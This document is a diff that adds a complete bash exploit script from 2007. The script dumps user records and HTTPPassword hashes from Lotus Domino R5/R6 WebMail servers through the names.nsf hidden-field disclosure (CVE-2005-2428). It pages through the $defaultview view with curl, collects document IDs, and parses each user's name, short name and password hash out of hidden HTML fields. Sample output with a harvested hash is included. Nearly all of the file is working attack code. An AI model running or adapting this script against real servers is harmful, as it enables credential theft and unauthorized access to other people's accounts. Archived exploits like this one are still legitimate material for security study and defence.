@@ -1,0 +1,139 @@
+#!/bin/bash
+
+#
+# $Id: raptor_dominohash,v 1.3 2007/02/13 17:27:28 raptor Exp $
+#
+# raptor_dominohash - Lotus Domino R5/R6 HTTPPassword dump
+# Copyright (c) 2007 Marco Ivaldi <raptor@0xdeadbeef.info>
+#
+# Lotus Domino R5 and R6 WebMail, with "Generate HTML for all fields" enabled, 
+# stores sensitive data from names.nsf in hidden form fields, which allows 
+# remote attackers to read the HTML source to obtain sensitive information such 
+# as (1) the password hash in the HTTPPassword field, (2) the password change 
+# date in the HTTPPasswordChangeDate field, (3) the client platform in the 
+# ClntPltfrm field, (4) the client machine name in the ClntMachine field, and 
+# (5) the client Lotus Domino release in the ClntBld field, a different 
+# vulnerability than CVE-2005-2696 (CVE-2005-2428).
+#
+# According to testing, it's possible to dump all HTTPPassword hashes using the 
+# $defaultview view instead of $users. This saves a considerable amount of time.
+# 
+# The code may require some changes to properly work with your configuration.
+#
+# See also:
+# http://www.securiteinfo.com/outils/DominoHashBreaker.shtml
+#
+# Usage:
+# $ ./raptor_dominohash 192.168.0.202
+# [...]
+# Extracting the view entries...
+# Done! 656 unique entries have been found.
+# Now ready to dump password hashes...
+# [...]
+# [http://192.168.0.202/names.nsf/$defaultview/00DA2289CC118A854925715A000611A3]
+# FirstName:      Foo
+# LastName:       Bar
+# ShortName:      fbar
+# HTTPPassword:   (355E98E7C7B59BD810ED845AD0FD2FC4)
+# [...]
+#
+# Vulnerable platforms:
+# Lotus Domino R6 Webmail [tested]
+# Lotus Domino R5 Webmail [untested]
+# Lotus Domino R4 Webmail? [untested]
+#
+
+# Some vars
+i=1
+tmp1=dominohash1.tmp
+tmp2=dominohash2.tmp
+
+# Command line
+host=$1
+
+# Local fuctions
+function header() {
+	echo ""
+	echo "raptor_dominohash - Lotus Domino R5/R6 HTTPPassword dump"
+	echo "Copyright (c) 2007 Marco Ivaldi <raptor@0xdeadbeef.info>"
+	echo ""
+}
+
+function footer() {
+	echo ""
+	exit 0
+}
+
+function usage() {
+	header
+	echo "usage  : ./raptor_dominohash <host>"
+	echo "example: ./raptor_dominohash 192.168.0.202"
+	footer
+}
+
+function notfound() {
+	header
+	echo "error  : curl not found"
+	footer
+}
+
+# Check if curl is there
+curl=`which curl 2>/dev/null`
+if [ $? -ne 0 ]; then
+	notfound
+fi
+
+# Input control
+if [ -z "$1"  ]; then
+	usage
+fi
+
+# Remove temporary files
+rm -f $tmp1
+rm -f $tmp2
+
+header
+
+# Extract the view entries
+echo "Extracting the view entries..."
+while :
+do
+	curl "http://${host}/names.nsf/\$defaultview?Readviewentries&Start=${i}" 2>/dev/null | grep unid >> $tmp1
+
+	# Check grep return value
+	if [ $? -ne 0 ]; then
+		break
+	fi
+
+	# Go for the next page
+	i=`expr $i + 30`
+	echo -ne "\b\b\b\b\b\b\b\b$i"
+done
+
+cat $tmp1 | awk -F'unid="' '{print $2}' | awk -F'"' '{print $1}' | sort | uniq > $tmp2
+
+# Check if some view entries have been found
+if [ ! -s $tmp2 ]; then
+	echo "No entries found on host ${host}!"
+	footer
+fi
+echo -ne "\b\b\b\b\b\b\b\bDone! "
+echo "`wc -l ${tmp2} | awk '{print $1}'` unique entries have been found."
+echo ""
+
+# Perform the hash dumping
+echo "Now ready to dump password hashes..."
+echo ""
+sleep 4
+for unid in `cat $tmp2`
+do
+	echo "[http://${host}/names.nsf/\$defaultview/${unid}]"
+	echo ""
+	#curl "http://${host}/names.nsf/\$defaultview/${unid}?OpenDocument" 2>/dev/null | egrep '"FullName"|"HTTPPassword"'
+	curl "http://${host}/names.nsf/\$defaultview/${unid}?OpenDocument" 2>/dev/null | egrep '"FirstName"|"LastName"|"ShortName"|"HTTPPassword"' | awk -F'input name="' '{print $2}' | awk -F'" type="hidden" value="' '{print $1 ":\t" $2}' | tr -d '">'
+	echo ""
+done
+
+footer
+
+# milw0rm.com [2007-02-13]
